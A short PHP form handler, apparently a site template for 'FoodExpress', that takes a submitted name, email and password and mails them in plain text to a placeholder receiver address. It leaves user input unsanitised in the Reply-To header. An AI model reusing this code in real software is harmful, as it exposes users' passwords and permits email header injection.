<?php	
	if(empty($_POST['name']) || empty($_POST['remail']) || empty($_POST['rpwd']))
	{
		return false;
	}
	
	$name = $_POST['name'];
	$remail = $_POST['remail'];
	$rpwd = $_POST['rpwd'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from FoodExpress Official.";
	$email_body = "You have received a new message. \n\n".
				  "Name: $name \nRemail: $remail \nRpwd: $rpwd \n";
	$headers = "From: contact@yoursite.com\n";
	$headers .= "Reply-To: $remail";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>